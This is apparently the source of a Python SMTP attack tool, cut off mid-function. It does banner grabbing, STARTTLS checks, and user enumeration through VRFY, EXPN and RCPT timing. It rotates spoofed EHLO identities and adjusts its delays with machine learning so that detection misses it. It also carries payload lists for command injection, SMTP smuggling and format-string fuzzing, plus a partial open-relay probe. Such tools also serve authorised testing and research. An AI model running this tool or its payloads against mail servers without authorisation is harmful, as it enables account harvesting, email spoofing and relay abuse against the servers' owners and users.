import socket
import smtplib
import time
import argparse
import sys
import logging
import subprocess
import ssl
import re
import random
import statistics
import threading
import concurrent.futures
from email.mime.text import MIMEText
from typing import List, Optional, Dict, Any, Tuple
from collections import deque

# Third-party libraries for advanced features
try:
    import numpy as np
    from sklearn.ensemble import IsolationForest
    ML_AVAILABLE = True
except ImportError:
    print("[-] scikit-learn (numpy, sklearn) not found. AI anomaly detection will be disabled.")
    ML_AVAILABLE = False

try:
    import matplotlib.pyplot as plt
    PLOTTING_AVAILABLE = True
except ImportError:
    print("[-] matplotlib not found. Timing graph visualization will be disabled.")
    PLOTTING_AVAILABLE = False

try:
    import dns.resolver
    import requests
    NETWORK_EXTRAS_AVAILABLE = True
except ImportError:
    print("[-] dnspython or requests not found. MTA-STS/DANE/Cloud checks will be limited.")
    NETWORK_EXTRAS_AVAILABLE = False

try:
    import socks # For proxy support
    SOCKS_AVAILABLE = True
except ImportError:
    print("[-] PySocks not found. SOCKS proxy support will be disabled.")
    SOCKS_AVAILABLE = False


# --- Setup Logging ---
# Setting level to DEBUG to capture granular info, useful for detailed analysis later
logging.basicConfig(filename='smtp_pentest.log', level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s')


# --- Global Configurations (Enhanced & Expanded) ---
SMTP_REPLIES = {
    '220': 'Service ready', '221': 'Service closing transmission channel', '250': 'Requested mail action okay, completed',
    '251': 'User not local; will forward to <forward-path>', '252': 'Cannot verify user, but will attempt to deliver message',
    '354': 'Start mail input; end with <CRLF>.<CRLF>', '421': 'Service not available, closing transmission channel',
    '450': 'Requested mail action not taken: mailbox unavailable', '451': 'Requested action aborted: local error in processing',
    '452': 'Requested action not taken: insufficient system storage', '500': 'Syntax error, command unrecognized',
    '501': 'Syntax error in parameters or arguments', '502': 'Command not implemented',
    '503': 'Bad sequence of commands', '504': 'Command parameter not implemented', '550': 'Requested action not taken: mailbox unavailable',
    '551': 'User not local or invalid address', '552': 'Requested mail action aborted: exceeded storage allocation',
    '553': 'Requested action not taken: mailbox name not allowed', '554': 'Transaction failed'
}

# --- Timing and Delay Configuration ---
DEFAULT_TIMEOUT = 10
SLOW_ATTACK_DELAY_MIN_DEFAULT = 0.5
SLOW_ATTACK_DELAY_MAX_DEFAULT = 2.0
BURST_ATTACK_DELAY_DEFAULT = 0.1 # Very short delay for rapid bursts where applicable
current_attack_delay_min = SLOW_ATTACK_DELAY_MIN_DEFAULT
current_attack_delay_max = SLOW_ATTACK_DELAY_MAX_DEFAULT
current_burst_delay = BURST_ATTACK_DELAY_DEFAULT

# --- EHLO Domain (for rotation) ---
EHLO_DOMAINS = [
    "mail.attacker.com", "outlook.microsoft.com", "google.com", "yahoo.com",
    "apple.com", "local.host", "internal.network", "proxy.domain",
    "mail.isp.net", "admin.company.net", "secure.server"
]
DEFAULT_EHLO_DOMAIN = random.choice(EHLO_DOMAINS) # Start with a random one

# --- Fuzzing Payloads (Expanded including more advanced smuggling) ---
# Each payload categorized by likely command context if relevant (for structured fuzzing)
FUZZING_PAYLOADS = {
    "generic": [
        b"\x00", b"\xff", b"\x0a\x0d", b"A"*1000, b"%", b"$", b"!", b"@", b"#", b"'", b"\"",
        b"--", b";", b"|", b"$(echo `whoami`)", b"SLEEP 5", b"OR 1=1 --", b"X" * 2048 # Long string
    ],
    "command_injection": [ # Payloads designed to inject new commands
        b"\r\nMAIL FROM:<injected@example.com>\r\n",
        b"\r\nRCPT TO:<injected@example.net>\r\n",
        b"\r\nQUIT\r\n", b"\r\nHELO evil.com\r\n",
        b"\r\nNOOP\r\n" # Test if it accepts unexpected NOOP
    ],
    "smuggling_data": [ # Payloads to test DATA stream termination parsing
        b"\r\n.\r\n", b"\n.\n", b"\r.\r", b"\r\n.\n", b"\n.\r\n",
        b"\r\n.\r\nMAIL FROM:<spoofed@attacker.com>\r\n", # In-DATA smuggling attempt
        b"\r\n.\r\nRCPT TO:<secret@target.com>\r\n",
        b"\r\n.\x0d\r\n", b"\r\n.\x0a\r\n", b"\x0d\n.\r\n" # Additional CRLF variations for smuggling
    ],
    "format_string": [ # Common format string vulnerabilities
        b"%s%n%x%d%f", b"%%.100s", b"%d%d%d%d%d%d%d%d%d%d"
    ]
}

# --- Common Internal Domains for Open Relay / Enumeration Hints ---
INTERNAL_DOMAINS = [
    "example.com", "internal.corp", "localhost", "mail.local", "smtp.local",
    "test.local", "dev.corp", "yourdomain.com" # Added for more local context
]
# --- Proxy Settings ---
PROXY_SETTINGS = {'host': None, 'port': None, 'type': None} # {'socks5', 'http'}

# --- AI Anomaly Detection ---
if ML_AVAILABLE:
    ISOLATION_FOREST_WINDOW_SIZE = 150 # Increased window size for more robust training data
    IF_CONTAMINATION = 0.03 # Lowered contamination - expect fewer true outliers in normal traffic
    isolation_forest_model = None
    response_data_for_ml = deque(maxlen=ISOLATION_FOREST_WINDOW_SIZE) # Stores [response_time, response_code_int]

# --- CVE Database (Updated with Real CVEs from 2024-2025) ---
KNOWN_SMTP_CVES = {
    "CVE-2025-26794": {
        "description": "Exim 4.98 before 4.98.1, when SQLite hints and ETRN serialization are used, allows remote SQL injection.",
        "product_regex_pattern": r"Exim (\d+\.\d+(\.\d+)?)",
        "vulnerable_versions_range": [("<=4.98", "4.98.1")], # Example: Any version up to 4.98, must be less than 4.98.1
        "vulnerable_features": ["SQLITE"], # Indicates if a capability is related to vul
        "recommendation": "Upgrade to Exim 4.98.1 or later. Disable SQLite hints if not needed.",
        "impact": "High"
    },
    "CVE-2025-30232": {
        "description": "A use-after-free in Exim 4.96 through 4.98.1 could allow users (with command-line access) to escalate privileges.",
        "product_regex_pattern": r"Exim (\d+\.\d+(\.\d+)?)",
        "vulnerable_versions_range": [(">=4.96", "<=4.98.1")],
        "vulnerable_features": [],
        "recommendation": "Upgrade to Exim 4.98.2 or later.",
        "impact": "Critical"
    },
    "CVE-2024-27305": {
        "description": "aiosmtpd is vulnerable to inbound SMTP smuggling. SMTP smuggling is a novel vulnerability based on interpretation differences of the SMTP protocol.",
        "product_regex_pattern": r"(aiosmtpd|Python SMTPD v?(\d+\.\d+(\.\d+)?))",
        "vulnerable_versions_range": [("<=1.4.4", None)], # Affected versions up to 1.4.4
        "vulnerable_features": ["SMTP_SMUGGLING"],
        "recommendation": "Update to aiosmtpd 1.4.4.post2 or later.",
        "impact": "Medium"
    },
    "CVE-2024-27938": {
        "description": "Postal is an open source SMTP server. Postal versions less than 3.0.0 are vulnerable to SMTP Smuggling attacks which may allow incoming e-mails to be spoofed.",
        "product_regex_pattern": r"(Postal v?(\d+\.\d+(\.\d+)?))",
        "vulnerable_versions_range": [(None, "<3.0.0")], # All versions before 3.0.0
        "vulnerable_features": ["SMTP_SMUGGLING"],
        "recommendation": "Upgrade to Postal 3.0.0 or later.",
        "impact": "Medium"
    },
    # General weaknesses
    "WEAKNESS-202X-VRFY-EXPN": {
        "description": "User enumeration via VRFY/EXPN exposing valid usernames. (Not a CVE but a common misconfiguration/weakness).",
        "product_regex_pattern": r".*", # Applies to any SMTP server
        "vulnerable_features": ["VRFY", "EXPN"],
        "recommendation": "Disable VRFY/EXPN or require authentication. Implement aggressive rate limiting.",
        "impact": "Medium"
    },
    "WEAKNESS-202X-OPEN-RELAY": {
        "description": "Server is configured as an Open Relay, allowing unauthorized mail routing. (Not a CVE but a critical security flaw).",
        "product_regex_pattern": r".*",
        "vulnerable_features": ["OPEN_RELAY"],
        "recommendation": "Configure strict relay policies. Require authentication for relaying beyond local domains.",
        "impact": "Critical"
    },
    "WEAKNESS-202X-CMD-INJ": {
        "description": "Potential SMTP command injection/smuggling vulnerability identified through fuzzing.",
        "product_regex_pattern": r".*",
        "vulnerable_features": ["COMMAND_INJECTION"],
        "recommendation": "Ensure robust input validation and canonicalization of all SMTP commands and arguments.",
        "impact": "High"
    },
    # Add more as needed, potentially specific versions for Postfix, Sendmail, Exchange
}


# --- Helper Functions ---
def get_random_ehlo_domain() -> str:
    """Returns a random EHLO domain for connection attempts."""
    return random.choice(EHLO_DOMAINS)

def create_raw_socket(target: str, port: int, timeout: int = DEFAULT_TIMEOUT) -> socket.socket:
    """Creates a raw socket, optionally via proxy."""
    s = None
    try:
        if SOCKS_AVAILABLE and PROXY_SETTINGS['host']:
            if PROXY_SETTINGS['type'] == 'socks5':
                s = socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
                s.set_proxy(socks.SOCKS5, PROXY_SETTINGS['host'], PROXY_SETTINGS['port'])
            else: # Fallback for other proxy types or if socks not chosen
                logging.warning(f"Proxy type {PROXY_SETTINGS['type']} not directly supported by Pysocks for raw socket. Using direct connection for raw socket.")
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        else:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        
        s.settimeout(timeout)
        s.connect((target, port))
        return s
    except Exception as e:
        if s: s.close() # Ensure socket is closed on error
        raise e

def _read_smtp_response(sock: socket.socket, timeout: int = DEFAULT_TIMEOUT) -> str:
    """
    Reads a complete SMTP response from the socket, handling multi-line responses.
    """
    sock.settimeout(timeout)
    response_buffer = b""
    start_time = time.time()
    try:
        while True:
            # Read a chunk
            part = sock.recv(4096)
            if not part: # Connection closed by peer
                logging.debug("Socket closed by peer during response read.")
                break
            response_buffer += part

            # Check for end of SMTP response line
            # A line ending with '250 ' or '500 ' (3 digits and a space, not dash) indicates end of a multi-line response
            # Or if no more data is received within timeout
            lines = response_buffer.split(b'\r\n')
            if len(lines) > 1 and len(lines[-2]) >= 3 and lines[-2][3:4] == b' ': # Last non-empty line
                if lines[-2][0:3].isdigit(): # Check if it starts with numeric code
                    break # Found end of response

            if time.time() - start_time > timeout:
                logging.warning(f"Timeout while reading complete SMTP response. Buffer: {response_buffer.decode('utf-8', errors='ignore')}")
                break
    except socket.timeout:
        logging.debug(f"Socket timeout during response read. Buffer: {response_buffer.decode('utf-8', errors='ignore')}")
    except ConnectionResetError:
        logging.warning("Connection reset by peer during response read.")
    except Exception as e:
        logging.error(f"Unexpected error during SMTP response read: {e}")
    return response_buffer.decode('utf-8', errors='ignore').strip()


# --- Core Connection Functions ---
def banner_grabbing(target: str, port: int = 25) -> Optional[str]:
    """Grabs SMTP banner from the target."""
    try:
        with create_raw_socket(target, port, DEFAULT_TIMEOUT) as sock:
            banner = _read_smtp_response(sock, timeout=DEFAULT_TIMEOUT)
            print(f"[+] Banner [{target}:{port}]: {banner}")
            logging.info(f"Banner [{target}:{port}]: {banner}")
            return banner
    except (socket.timeout, ConnectionRefusedError) as e:
        print(f"[-] Error during banner grabbing from {target}:{port}: {e}")
        logging.error(f"Error grabbing banner from {target}:{port}: {e}")
    except Exception as e:
        print(f"[-] Unexpected error grabbing banner from {target}:{port}: {e}")
        logging.error(f"Unexpected error grabbing banner from {target}:{port}: {e}")
    return None

def check_starttls(target: str, port: int = 25) -> Tuple[bool, List[str]]:
    """
    Checks for STARTTLS support and enumerates other ESMTP extensions using EHLO.
    Returns (is_starttls_supported, [list_of_extensions]).
    """
    extensions = []
    try:
        with create_raw_socket(target, port, DEFAULT_TIMEOUT) as sock:
            banner_response = _read_smtp_response(sock) # Read initial banner
            if not banner_response.startswith('220'):
                logging.warning(f"Unexpected banner response for STARTTLS check: {banner_response.strip()}")

            sock.send(f"EHLO {get_random_ehlo_domain()}\r\n".encode('utf-8'))
            response_raw = _read_smtp_response(sock)
            
            lines = response_raw.splitlines()
            for line in lines:
                if line.startswith("250-") or line.startswith("250 "):
                    ext = line[4:].strip().upper() # Convert to upper for consistent comparison
                    if ext:
                        extensions.append(ext)
            
            starttls_supported = "STARTTLS" in extensions
            print(f"[+] STARTTLS supported: {starttls_supported}")
            print(f"[+] Supported ESMTP Extensions: {', '.join(extensions) or 'None'}")
            logging.info(f"STARTTLS supported: {starttls_supported}, Extensions: {', '.join(extensions)}")
            return starttls_supported, extensions
    except Exception as e:
        print(f"[-] Error checking STARTTLS/EHLO extensions: {e}")
        logging.error(f"Error checking STARTTLS/EHLO extensions: {e}")
        return False, []

def connect_smtp(target: str, port: int, use_tls: bool = False, timeout: int = DEFAULT_TIMEOUT) -> Optional[smtplib.SMTP]:
    """
    Establishes an SMTP connection, supporting plain, STARTTLS, and SMTPS.
    Attempts multiple connection methods if initial fails, and dynamically adapts.
    """
    server_attempt = None
    context = ssl.create_default_context()
    context.check_hostname = False  # For pentesting, bypass hostname checks
    context.verify_mode = ssl.CERT_NONE  # For pentesting, bypass cert validation
    context.minimum_version = ssl.TLSVersion.TLSv1_2 # Always try TLSv1.2+
    try:
        context.minimum_version = ssl.TLSVersion.TLSv1_3 # Prefer TLS 1.3
    except AttributeError:
        logging.warning("TLSv1_3 not supported by current Python installation, falling back to highest available.")

    ehlo_domain = get_random_ehlo_domain()
    attempts = [] # To log connection attempts flow

    # Attempt 1: Direct SMTP_SSL (usually port 465) or if TLS is forced and port matches
    if port == 465 or (use_tls and port in [25, 587]):
        try:
            print(f"[*] Attempting direct SMTPS (SMTP_SSL) on {target}:{port}...")
            # Use a custom socket if proxied
            if SOCKS_AVAILABLE and PROXY_SETTINGS['host'] and PROXY_SETTINGS['type'] == 'socks5':
                s = create_raw_socket(target, port, timeout)
                server_attempt = smtplib.SMTP_SSL(target, port, timeout=timeout, context=context, _socket=s)
            else:
                server_attempt = smtplib.SMTP_SSL(target, port, timeout=timeout, context=context)
            
            server_attempt.ehlo(ehlo_domain) # EHLO after connection
            attempts.append(f"SMTPS success({port})")
            logging.info(f"Successfully connected via SMTPS to {target}:{port}")
            return server_attempt
        except smtplib.SMTPConnectError as e:
            attempts.append(f"SMTPS fail({port}:{e})")
            logging.debug(f"SMTPS connection failed to {target}:{port}: {e}")
        except Exception as e:
            attempts.append(f"SMTPS fail({port}:{e})")
            logging.debug(f"Unexpected error connecting via SMTPS: {e}")

    # Attempt 2: Plain SMTP, then STARTTLS upgrade
    try:
        print(f"[*] Attempting plain SMTP on {target}:{port} with potential STARTTLS upgrade...")
        # Use custom raw_socket creation if proxy is active
        if SOCKS_AVAILABLE and PROXY_SETTINGS['host'] and PROXY_SETTINGS['type'] == 'socks5':
            sock = create_raw_socket(target, port, timeout)
            server_attempt = smtplib.SMTP(target, port, timeout=timeout, _socket=sock)
        else:
            server_attempt = smtplib.SMTP(target, port, timeout=timeout)
        
        server_attempt.ehlo(ehlo_domain)
        ehlo_response = server_attempt.ehlo_resp.decode('utf-8', errors='ignore') if server_attempt.ehlo_resp else ""
        attempts.append(f"Plain SMTP EHLO ok ({ehlo_response.strip()[:50]})")
        
        if "STARTTLS" in ehlo_response.upper(): # Check case-insensitively
            if use_tls or port == 587: # Only upgrade if requested or it's submission port
                try:
                    print(f"[*] STARTTLS supported. Attempting to upgrade connection on {target}:{port}.")
                    server_attempt.starttls(context=context)
                    server_attempt.ehlo(ehlo_domain) # EHLO again after STARTTLS
                    attempts.append("STARTTLS upgrade success")
                    logging.info(f"Successfully upgraded to STARTTLS on {target}:{port}")
                except smtplib.SMTPException as e:
                    attempts.append(f"STARTTLS upgrade fail: {e}")
                    print(f"[-] STARTTLS upgrade failed: {e}")
                    logging.warning(f"STARTTLS upgrade failed on {target}:{port}: {e}")
                    # No quit here, as it might have thrown for other reasons
                    return None
            else:
                attempts.append("STARTTLS supported but not forced/ignored")
                logging.info(f"STARTTLS supported but not forced/ignored (port {port})")
        else:
            attempts.append("STARTTLS not supported")
            logging.info(f"STARTTLS not supported on {target}:{port}")
        
        return server_attempt

    except smtplib.SMTPConnectError as e:
        attempts.append(f"Plain SMTP connect fail: {e}")
        logging.debug(f"Plain SMTP connection failed to {target}:{port}: {e}")
    except smtplib.SMTPException as e:
        attempts.append(f"SMTP protocol error during connection: {e}")
        logging.debug(f"SMTP protocol error during connection to {target}:{port}: {e}")
    except (ConnectionRefusedError, socket.timeout) as e:
        attempts.append(f"Connection timeout/refused: {e}")
        logging.debug(f"Connection refused/timed out to {target}:{port}: {e}")
    except Exception as e:
        attempts.append(f"Fatal error during connection: {e}")
        logging.critical(f"Fatal error connecting to {target}:{port}: {e}")

    finally:
        if server_attempt:
            try:
                server_attempt.quit()
            except Exception as e:
                logging.debug(f"Error quiting SMTP session cleanly: {e}")
        logging.error(f"Failed to establish any SMTP connection. Attempts: {' | '.join(attempts)}")
        print(f"[-] Failed to establish any SMTP connection to {target}:{port}.")
    return None

# --- AI/ML Anomaly Detection (Integrated) ---
if ML_AVAILABLE:
    def classify_response_anomaly(response_time: float, response_code: int) -> float:
        """
        Classifies response as anomalous using Isolation Forest.
        Returns a score: negative implies anomaly, positive implies inlier. Stronger negative means more anomalous.
        """
        global isolation_forest_model
        global response_data_for_ml
        response_data_for_ml.append([response_time, float(response_code)]) # Ensure data is float
        if len(response_data_for_ml) < 20: # Need minimum data points to train
            logging.debug(f"Not enough data for Isolation Forest: {len(response_data_for_ml)}/{ISOLATION_FOREST_WINDOW_SIZE}")
            return 0.0 # Return neutral score
        data_array = np.array(list(response_data_for_ml))
        # Retrain model if full, or if first time
        if isolation_forest_model is None or len(response_data_for_ml) == ISOLATION_FOREST_WINDOW_SIZE:
            try:
                isolation_forest_model = IsolationForest(
                    random_state=42,
                    contamination=IF_CONTAMINATION,
                    n_estimators=200, verbose=0, n_jobs=-1
                )
                isolation_forest_model.fit(data_array)
                logging.info("Isolation Forest model retrained successfully.")
            except ValueError as e:
                logging.error(f"Error training Isolation Forest: {e}")
                return 0.0 # Indicate no valid score
        try:
            score = isolation_forest_model.decision_function([[response_time, float(response_code)]])[0]
            return score
        except Exception as e:
            logging.error(f"Error classifying response anomaly: {e}")
            return 0.0

    def adjust_attack_delay(anomaly_score: float):
        """Dynamically adjusts attack delay based on anomaly score."""
        global current_attack_delay_min, current_attack_delay_max, current_burst_delay
        
        # Corrected arithmetic operations from ' _x' to '* x'
        if anomaly_score < -0.3: # Strong anomaly
            current_attack_delay_min = min(current_attack_delay_min * 2, SLOW_ATTACK_DELAY_MAX_DEFAULT * 2)
            current_attack_delay_max = min(current_attack_delay_max * 2, SLOW_ATTACK_DELAY_MAX_DEFAULT * 2)
            current_burst_delay = min(current_burst_delay * 5, SLOW_ATTACK_DELAY_MAX_DEFAULT) # Significantly slow down bursts
            print(f"[!] Critical AI Anomaly detected! Significant increase in delays to MIN:{current_attack_delay_min:.2f} MAX:{current_attack_delay_max:.2f} BURST:{current_burst_delay:.2f}")
            logging.critical(f"Critical AI Anomaly: Delays increased to {current_attack_delay_min:.2f}/{current_attack_delay_max:.2f}")
        elif anomaly_score < -0.1: # Moderate anomaly
            current_attack_delay_min = min(current_attack_delay_min * 1.5, SLOW_ATTACK_DELAY_MAX_DEFAULT)
            current_attack_delay_max = min(current_attack_delay_max * 1.5, SLOW_ATTACK_DELAY_MAX_DEFAULT)
            current_burst_delay = min(current_burst_delay * 2, SLOW_ATTACK_DELAY_MAX_DEFAULT / 2)
            print(f"[!] Moderate AI Anomaly detected. Increasing delays to MIN:{current_attack_delay_min:.2f} MAX:{current_attack_delay_max:.2f}")
            logging.warning(f"Moderate AI Anomaly: Delays increased to {current_attack_delay_min:.2f}/{current_attack_delay_max:.2f}")
        elif anomaly_score > 0.3 and current_attack_delay_min > SLOW_ATTACK_DELAY_MIN_DEFAULT: # Consistent normal behavior, can speed up
            current_attack_delay_min = max(current_attack_delay_min * 0.8, SLOW_ATTACK_DELAY_MIN_DEFAULT)
            current_attack_delay_max = max(current_attack_delay_max * 0.8, SLOW_ATTACK_DELAY_MIN_DEFAULT * 2) # Keep max somewhat higher
            current_burst_delay = max(current_burst_delay * 0.5, BURST_ATTACK_DELAY_DEFAULT)
            logging.info(f"Normal AI behavior detected. Delays decreased to {current_attack_delay_min:.2f}/{current_attack_delay_max:.2f}")
        # Ensure delays don't go below absolute minimums
        current_attack_delay_min = max(current_attack_delay_min, BURST_ATTACK_DELAY_DEFAULT / 2) # No zero delay
        current_attack_delay_max = max(current_attack_delay_max, current_attack_delay_min * 1.5)


# --- User Enumeration ---
def user_enumeration_vrfy(target: str, users: List[str], port: int = 25) -> List[str]:
    """User enumeration using VRFY, with adaptive delays."""
    valid_users = []
    print(f"\n[*] Starting VRFY enumeration for {target}:{port} with {len(users)} users...")
    server = None
    try:
        server = connect_smtp(target, port)
        if not server:
            print(f"[-] Could not connect for VRFY enumeration.")
            return valid_users # Exit if connection fails
        
        for user in users:
            start_time = time.time()
            try:
                code, msg = server.vrfy(user)
                response_raw = f"{code} {msg.decode('utf-8', errors='ignore').strip()}"
                end_time = time.time()
                response_time = end_time - start_time
                
                response_code_prefix = code
                
                if code in [250, 252]: # 250 OK, 252 Cannot verify, but will attempt to delivery
                    print(f"[+] Valid user (VRFY): {user} (Response: {response_raw})")
                    logging.info(f"Valid user (VRFY): {user} (Response: {response_raw})")
                    valid_users.append(user)
                else:
                    print(f"[-] Invalid user (VRFY): {user} (Response: {response_raw})")
                    logging.debug(f"Invalid user (VRFY): {user} (Response: {response_raw})")
                
                if ML_AVAILABLE:
                    anomaly_score = classify_response_anomaly(response_time, response_code_prefix)
                    adjust_attack_delay(anomaly_score)
                time.sleep(random.uniform(current_attack_delay_min, current_attack_delay_max))
            except smtplib.SMTPServerDisconnected:
                print(f"[-] VRFY: Server disconnected for {user}. Reconnecting if possible.")
                logging.warning(f"VRFY: Server disconnected for {user}.")
                if ML_AVAILABLE: adjust_attack_delay(-0.5)
                server = connect_smtp(target,port) # Try to reconnect
                if not server: break # If reconnect fails, stop
            except smtplib.SMTPException as e:
                print(f"[-] VRFY: SMTP error for {user}: {e}")
                logging.error(f"VRFY: SMTP error for {user}: {e}")
            except Exception as e:
                print(f"[-] VRFY: Unexpected error for {user}: {e}")
                logging.error(f"VRFY: Unexpected error for {user}: {e}")
                break # Break on critical error
    except Exception as e:
        print(f"[-] Connection setup error for VRFY enumeration: {e}")
        logging.error(f"Connection setup error for VRFY enumeration: {e}")
    finally:
        if server: server.quit() # Ensure server object is quit
    return valid_users

def user_enumeration_expn(target: str, list_names: List[str], port: int = 25) -> Dict[str, str]:
    """User enumeration using EXPN with potential list names and adaptive delays."""
    expn_results = {}
    print(f"\n[*] Starting EXPN enumeration for {target}:{port} with {len(list_names)} lists...")
    server = None
    try:
        server = connect_smtp(target, port)
        if not server:
            print(f"[-] Could not connect for EXPN enumeration.")
            return expn_results

        for list_name in list_names:
            start_time = time.time()
            try:
                code, msg = server.expn(list_name)
                response_raw = f"{code} {msg.decode('utf-8', errors='ignore').strip()}"
                end_time = time.time()
                response_time = end_time - start_time
                response_code_prefix = code
                
                if code == 250: # 250 OK
                    print(f"[+] EXPN response for {list_name}: {response_raw}")
                    logging.info(f"EXPN response for {list_name}: {response_raw}")
                    expn_results[list_name] = response_raw
                else:
                    print(f"[-] EXPN response for {list_name} not successful: {response_raw}")
                    logging.debug(f"EXPN failed for {list_name}: {response_raw}")
                
                if ML_AVAILABLE:
                    anomaly_score = classify_response_anomaly(response_time, response_code_prefix)
                    adjust_attack_delay(anomaly_score)
                time.sleep(random.uniform(current_attack_delay_min, current_attack_delay_max))
            except smtplib.SMTPServerDisconnected:
                print(f"[-] EXPN: Server disconnected for {list_name}. Reconnecting if possible.")
                logging.warning(f"EXPN: Server disconnected for {list_name}.")
                if ML_AVAILABLE: adjust_attack_delay(-0.5)
                server = connect_smtp(target,port) # Try to reconnect
                if not server: break # If reconnect fails, stop
            except smtplib.SMTPException as e:
                print(f"[-] EXPN: SMTP error for {list_name}: {e}")
                logging.error(f"EXPN: SMTP error for {list_name}: {e}")
            except Exception as e:
                print(f"[-] EXPN: Unexpected error for {list_name}: {e}")
                logging.error(f"EXPN: Unexpected error for {list_name}: {e}")
                break
    except Exception as e:
        print(f"[-] Connection setup error for EXPN enumeration: {e}")
        logging.error(f"Connection setup error for EXPN enumeration: {e}")
    finally:
        if server: server.quit()
    return expn_results


def user_enumeration_rcpt(target: str, users: List[str], domains: List[str], sender: str = "attacker@example.com", port: int = 25, attempts_per_user: int = 3) -> Tuple[List[str], Dict[str, List[float]]]:
    """
    Advanced User Enumeration using RCPT TO with robust timing analysis and adaptive delays.
    Returns valid users and a dictionary of all collected timing data for plotting.
    Uses smtplib for robustness.
    """
    valid_users = set()
    all_timing_data: Dict[str, List[float]] = {'valid_likely': [], 'invalid_likely': [], 'anomalous': []}
    print(f"\n[*] Starting RCPT TO enumeration for {len(users)} users, {len(domains)} domains, {attempts_per_user} attempts each...")

    for domain in domains:
        print(f"[+] Testing RCPT TO against domain: {domain}")
        current_sender_email = f"attacker@{domain}" # Use dynamic sender for better evasion
        user_chunks = [users[i:i + 20] for i in range(0, len(users), 20)] # Process in chunks

        for chunk_idx, user_chunk in enumerate(user_chunks):
            server = None
            try:
                server = connect_smtp(target, port)
                if not server:
                    print(f"[-] Could not establish connection for RCPT TO chunk {chunk_idx}. Skipping.")
                    continue
                
                # Send MAIL FROM once per chunk
                try:
                    server.mail(current_sender_email)
                except smtplib.SMTPRecipientsRefused as e:
                    print(f"[-] MAIL FROM rejected with: {e.smtp_code} {e.smtp_error.decode()}. Cannot proceed with RCPT TO for this chunk.")
                    logging.warning(f"MAIL FROM rejected for {target}:{port}: {e}")
                    continue
                except smtplib.SMTPServerDisconnected:
                    print(f"[-] Server disconnected during MAIL FROM. Retrying chunk.")
                    logging.warning(f"Server disconnected during MAIL FROM for {target}:{port}.")
                    continue
                except smtplib.SMTPException as e:
                    print(f"[-] SMTP error during MAIL FROM: {e}. Skipping chunk.")
                    logging.error(f"SMTP error during MAIL FROM for {target}:{port}: {e}")
                    continue

                user_response_times_in_chunk = {} # {user_full_email: [times]}

                for user in user_chunk:
                    times_for_user = []
                    all_timing_data: Dict[str, List[float]] = {'valid_likely': [], 'invalid_likely': [], 'anomalous': []}
                    recipient_email = f"{user}@{domain}"
                    for attempt in range(attempts_per_user):
                        try:
                            start_time = time.time()
                            code, msg = server.rcpt(recipient_email) # Use smtplib's rcpt command
                            response_raw = f"{code} {msg.decode('utf-8', errors='ignore').strip()}"
                            end_time = time.time()
                            response_time = end_time - start_time
                            
                            times_for_user.append(response_time)
                            response_code_prefix = code
                            
                            if code == 250: # 250 OK
                                all_timing_data['valid_likely'].append(response_time)
                                valid_users.add(recipient_email)
                                print(f"[+] Valid user (RCPT): {recipient_email} (Resp: {response_raw[:50]}, Time: {response_time:.4f}s)")
                                logging.info(f"Valid user (RCPT): {recipient_email} (Resp: {response_raw})")
                            elif code in [550, 551, 553]: # Permanent failure, usually invalid user
                                all_timing_data['invalid_likely'].append(response_time)
                                logging.debug(f"[-] Invalid user (RCPT): {recipient_email} (Resp: {response_raw[:50]}, Time: {response_time:.4f}s)")
                            else: # All other responses, could be anomalous
                                all_timing_data['anomalous'].append(response_time)
                                logging.info(f"[*] Anomalous RCPT response for {recipient_email}: {response_raw[:50]} (Time: {response_time:.4f}s)")
                            
                            if ML_AVAILABLE:
                                anomaly_score = classify_response_anomaly(response_time, response_code_prefix)
                                adjust_attack_delay(anomaly_score)
                            time.sleep(random.uniform(current_burst_delay, current_burst_delay * 2)) # Small delay after each attempt

                        except smtplib.SMTPServerDisconnected:
                            print(f"[-] RCPT TO: Server disconnected for {recipient_email}. Reconnecting for next attempt.")
                            logging.warning(f"RCPT TO: Server disconnected for {recipient_email}.")
                            if ML_AVAILABLE: adjust_attack_delay(-0.5)
                            server = connect_smtp(target, port) # Try to reconnect if server fails mid-chunk
                            if not server: break # If reconnect fails, break current user attempts, proceed to next chunk
                        except smtplib.SMTPException as e:
                            print(f"[-] RCPT TO: SMTP exception for {recipient_email}: {e.smtp_code} {e.smtp_error.decode()}. Skipping further attempts for this user.")
                            logging.error(f"RCPT TO: SMTP exception for {recipient_email}: {e}")
                            if ML_AVAILABLE: adjust_attack_delay(-0.3)
                            break # Skip further attempts for this user if SMTP exception occurs
                        except Exception as e:
                            print(f"[-] RCPT TO: General error for {recipient_email}: {e}. Skipping further attempts for this user.")
                            logging.error(f"RCPT TO: General error for {recipient_email}: {e}")
                            break # Skip further attempts for this user

                    if times_for_user:
                        user_response_times_in_chunk[recipient_email] = times_for_user

                # Advanced Timing Analysis within the chunk (if ML is enabled)
                if user_response_times_in_chunk and ML_AVAILABLE:
                    all_times_in_chunk = [t for times_list in user_response_times_in_chunk.values() for t in times_list]
                    if all_times_in_chunk and len(all_times_in_chunk) > 1: # Need more than 1 sample for stdev
                        median_time = statistics.median(all_times_in_chunk)
                        stdev_time = statistics.stdev(all_times_in_chunk)

                        for user_full_email, times in user_response_times_in_chunk.items():
                            if not times: continue
                            avg_user_time = statistics.mean(times)
                            if abs(avg_user_time - median_time) > stdev_time * 2: # More than 2 stdev from median
                                if user_full_email not in valid_users: # Only add if not already clearly valid
                                    print(f"[+] Possible valid user (timing anomaly): {user_full_email} (Avg Time: {avg_user_time:.4f}s, Median: {median_time:.4f}s, StDev: {stdev_time:.4f}s)")
                                    logging.info(f"Possible valid user (timing anomaly): {user_full_email}")
                                    valid_users.add(user_full_email)
                                    all_timing_data['anomalous'].append(avg_user_time) # Add this outlier point for plotting

            except Exception as e:
                print(f"[-] General error in RCPT TO chunk processing (connection/setup issues): {e}")
                logging.error(f"General error in RCPT TO chunk processing: {e}")
            finally:
                if server:
                    try:
                        server.quit()
                    except: pass
                time.sleep(random.uniform(current_attack_delay_min, current_attack_delay_max))

    return list(valid_users), all_timing_data

# --- Open Relay & Smuggling/Fuzzing ---
def check_open_relay_aggressive(target: str, probe_from_emails: List[str], probe_to_emails: List[str], port: int = 25) -> bool:
    """
    Checks for Open Relay more aggressively by trying various sender/recipient combinations,
    including internal-looking domains, and logging all attempts.
    """
    print(f"\n[*] Starting aggressive Open Relay check on {target}:{port}...")
    probe_from_emails_expanded = list(set(probe_from_emails + [f"user@{d}" for d in INTERNAL_DOMAINS]))
    found_open_relay = False
    for from_email in probe_from_emails_expanded:
